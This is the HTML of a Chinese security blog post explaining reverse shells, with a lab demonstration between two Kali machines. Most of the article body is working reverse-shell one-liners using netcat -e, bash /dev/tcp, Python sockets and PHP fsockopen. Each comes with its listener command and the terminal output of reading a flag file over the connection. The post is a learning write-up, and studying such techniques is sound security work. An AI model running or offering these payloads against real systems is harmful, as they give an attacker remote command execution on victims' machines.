@@ -1,0 +1,598 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Web" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/2f610211.html">
+
+
+
+  <title>
+反弹shell - Web狗的自我安慰 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">反弹shell
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-06-18 19:57:36">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-06-18T19:57:36+08:00">2024-06-18</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture174.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web狗的自我安慰"><span itemprop="name">Web狗的自我安慰</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/2f610211.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell">#</a> 反弹 shell：</h1>
+<h2 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介；</h2>
+<p>​		反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
+<h2 id="正向连接"><a class="markdownIt-Anchor" href="#正向连接">#</a> 正向连接：</h2>
+<p>​		假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p>
+<h2 id="反向连接"><a class="markdownIt-Anchor" href="#反向连接">#</a> 反向连接：</h2>
+<p>​		反弹 shell 通常适用于如下几种情况：</p>
+<ul>
+<li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li>
+<li>目标机端口被占用。</li>
+<li>目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li>
+</ul>
+<p>​		对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>
+<p>​		反向连接就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p>
+<h2 id="利用netcat反弹shell"><a class="markdownIt-Anchor" href="#利用netcat反弹shell">#</a> 利用 netcat 反弹 shell：</h2>
+<p>​		目前，默认的各个 linux 发行版本已经自带了 netcat 工具包，但是可能由于处于安全考虑原生版本的 netcat 带有可以直接发布与反弹本地 shell 的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
+<p>​		安装完原生版本的 netcat 工具后，便有了 netcat -e 参数，我们就可以将本地 bash 反弹到攻击机上了。</p>
+<h3 id="攻击机开启本地监听"><a class="markdownIt-Anchor" href="#攻击机开启本地监听">#</a> <strong>攻击机开启本地监听：</strong></h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp 2333</span><br></pre></td></tr></table></figure>
+<h3 id="目标机主动连接攻击机"><a class="markdownIt-Anchor" href="#目标机主动连接攻击机">#</a> <strong>目标机主动连接攻击机：</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat &lt;攻击机的IP&gt; 2333 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<h3 id="结果"><a class="markdownIt-Anchor" href="#结果">#</a> 结果：</h3>
+<p>​		首先，我在目标机的根目录存放了一个 flag 文件，之后我尝试在攻击机上读取这个文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat /flag</span></span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure>
+<p>​		之后，我们尝试在攻击机上读取 flag 文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# netcat -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 39610</span><br><span class="line">cat /flag</span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br><span class="line">qwe</span><br><span class="line">ca][</span><br></pre></td></tr></table></figure>
+<p>​		首先在攻击机上监听了一下 2333 端口，然后用目标机建立连接，这个时候，我们发现成功读取了 flag 文件，后面我还尝试了几个错误的命令，在目标机器上输出了错误信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# netcat 192.168.209.137  2333 -e /bin/bash</span><br><span class="line">bash: line 2: qwe: command not found</span><br><span class="line">bash: line 3: ca][: command not found</span><br></pre></td></tr></table></figure>
+<h2 id="利用bash反弹shell"><a class="markdownIt-Anchor" href="#利用bash反弹shell">#</a> 利用 Bash 反弹 shell</h2>
+<p>​		直接放代码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/2333 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>bash -i</strong>   打开一个交互的 bash</li>
+<li><strong>&gt;&amp;</strong>  将标准错误输出重定向到标准输出</li>
+<li><strong>/dev/tcp/x.x.x.x/port</strong>  意为调用 socket, 建立 socket 连接，其中 x.x.x.x 为要反弹到的主机 ip，port 为端口</li>
+<li><strong>0&gt;&amp;1</strong>   标准输入重定向到标准输出，实现你与反弹出来的 shell 的交互</li>
+</ul>
+<h3 id="攻击机开启本地监听-2"><a class="markdownIt-Anchor" href="#攻击机开启本地监听-2">#</a> <strong>攻击机开启本地监听：</strong></h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+<h3 id="目标机主动连接攻击机-2"><a class="markdownIt-Anchor" href="#目标机主动连接攻击机-2">#</a> <strong>目标机主动连接攻击机：</strong></h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h3 id="结果-2"><a class="markdownIt-Anchor" href="#结果-2">#</a> 结果：</h3>
+<p>​	攻击机上，我们尝试读取了下文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 54426</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# cat /flag                                                                                                                                                                                                </span><br><span class="line">cat /flag</span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# qwe                                                                                                                                                                                                      </span><br><span class="line">qwe</span><br><span class="line">bash: qwe: command not found</span><br></pre></td></tr></table></figure>
+<p>​		不过这两个系统都是 kali，倒不是很容易看出来区别是啥？不过，还是把 flag 给都出来了，对了，第一个交互和第二个交互所在的文件夹不同了，这里应该能区分吧。</p>
+<p>​		接下来看看目标机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.209.137/2333 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+<p>​		发现，没有任何输出，连胡乱输入的命令的报错都没有，说明真的重定向了。</p>
+<h2 id="python-脚本反弹shell"><a class="markdownIt-Anchor" href="#python-脚本反弹shell">#</a> Python 脚本反弹 shell：</h2>
+<p>​		当目标主机上有 python 环境时，我们可以用 Python 来反弹 shell。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<h3 id="攻击机开启本地监听-3"><a class="markdownIt-Anchor" href="#攻击机开启本地监听-3">#</a> <strong>攻击机开启本地监听：</strong></h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+<h3 id="目标机主动连接攻击机-3"><a class="markdownIt-Anchor" href="#目标机主动连接攻击机-3">#</a> <strong>目标机主动连接攻击机：</strong></h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;目标机IP&gt;&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="结果-3"><a class="markdownIt-Anchor" href="#结果-3">#</a> 结果：</h3>
+<p>​		先看看攻击机的情况吧，这里很明显能看出来被攻击了，还是 /bin/sh 这个 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 46622</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /flag</span>           </span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure>
+<p>​		目标机器也是，啥输出都没有：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.209.137&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="php-脚本反弹shell"><a class="markdownIt-Anchor" href="#php-脚本反弹shell">#</a> php 脚本反弹 shell：</h2>
+<p>​		当然，CTF 中最经典的 PHP 不能忘了，老样子，</p>
+<h3 id="攻击机监听端口"><a class="markdownIt-Anchor" href="#攻击机监听端口">#</a> 攻击机监听端口：</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+<h3 id="目标机器运行php脚本"><a class="markdownIt-Anchor" href="#目标机器运行php脚本">#</a> 目标机器运行 php 脚本：</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;&lt;攻击机IP地址&gt;&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="结果-4"><a class="markdownIt-Anchor" href="#结果-4">#</a> 结果：</h3>
+<p>​		攻击机成功读取到了 flag：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -lvvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host</span><br><span class="line">connect to [192.168.209.137] from bogon [192.168.209.130] 36986</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">flag&#123;Nice_Try_You_Get_The_flag&#125;</span><br></pre></td></tr></table></figure>
+<p>​		目标机器也没有任何输出：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# php -r &#x27;$sock=fsockopen(&quot;192.168.209.137&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a class="markdownIt-Anchor" href="#参考">#</a> 参考：</h1>
+<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTQ4OA==">反弹 shell，这一篇就够了</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9icnVjZXRnLmdpdGh1Yi5pby8yMDE4LzA1LzAzLyVFNSVBNCU5QSVFNyVBNyU4RCVFNSVBNyVCRiVFNSU4QSVCRiVFNSU4RiU4RCVFNSVCQyVCOXNoZWxsLw==">多种姿势反弹 shell    </span></p>
+
+      <div class="tags">
+          <a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i> Web</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-06-21 22:32:27" itemprop="dateModified" datetime="2024-06-21T22:32:27+08:00">2024-06-21</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/2f610211.html" title="反弹shell">http://blog.g01den.top/posts/2f610211.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/2bb7953f.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture301.jpg" title="部分CVE复现Web（1）">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Web</span>
+  <h3>部分CVE复现Web（1）</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/d7e2e20f.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture49.jpg" title="pwn学习笔记（0）-事后补充">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（0）-事后补充</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text"> 反弹 shell：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> 简介；</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text"> 正向连接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 反向连接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.4.</span> <span class="toc-text"> 利用 netcat 反弹 shell：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E6%9C%AC%E5%9C%B0%E7%9B%91%E5%90%AC"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 攻击机开启本地监听：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 目标机主动连接攻击机：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 结果：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.5.</span> <span class="toc-text"> 利用 Bash 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E6%9C%AC%E5%9C%B0%E7%9B%91%E5%90%AC-2"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 攻击机开启本地监听：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB%E6%9C%BA-2"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 目标机主动连接攻击机：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-2"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 结果：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.6.</span> <span class="toc-text"> Python 脚本反弹 shell：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E6%9C%AC%E5%9C%B0%E7%9B%91%E5%90%AC-3"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 攻击机开启本地监听：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB%E6%9C%BA-3"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 目标机主动连接攻击机：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-3"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 结果：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.7.</span> <span class="toc-text"> php 脚本反弹 shell：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 攻击机监听端口：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E8%BF%90%E8%A1%8Cphp%E8%84%9A%E6%9C%AC"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 目标机器运行 php 脚本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C-4"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 结果：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text"> 参考：</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/posts/384200ef.html" rel="bookmark" title="SQL无列名注入">SQL无列名注入</a></li><li><a href="/posts/88915f6f.html" rel="bookmark" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></li><li class="active"><a href="/posts/2f610211.html" rel="bookmark" title="反弹shell">反弹shell</a></li><li><a href="/posts/ff5b88d5.html" rel="bookmark" title="python原型链污染">python原型链污染</a></li><li><a href="/posts/97a7dff3.html" rel="bookmark" title="ctfshow-信息搜集">ctfshow-信息搜集</a></li><li><a href="/posts/53e2b2e1.html" rel="bookmark" title="ctfshow-命令执行">ctfshow-命令执行</a></li><li><a href="/posts/4fb535d6.html" rel="bookmark" title="ctfshow-反序列化">ctfshow-反序列化</a></li><li><a href="/posts/b856856d.html" rel="bookmark" title="ctfshow-ssrf">ctfshow-ssrf</a></li><li><a href="/posts/ad175165.html" rel="bookmark" title="ctfshow-文件包含">ctfshow-文件包含</a></li><li><a href="/posts/4826d2ce.html" rel="bookmark" title="ctfshow-SSTI">ctfshow-SSTI</a></li><li><a href="/posts/2d792864.html" rel="bookmark" title="Python栈帧逃逸">Python栈帧逃逸</a></li><li><a href="/posts/b3ad4123.html" rel="bookmark" title="有小考点的Web题">有小考点的Web题</a></li><li><a href="/posts/a4378bd0.html" rel="bookmark" title="【2025】LitCTF">【2025】LitCTF</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
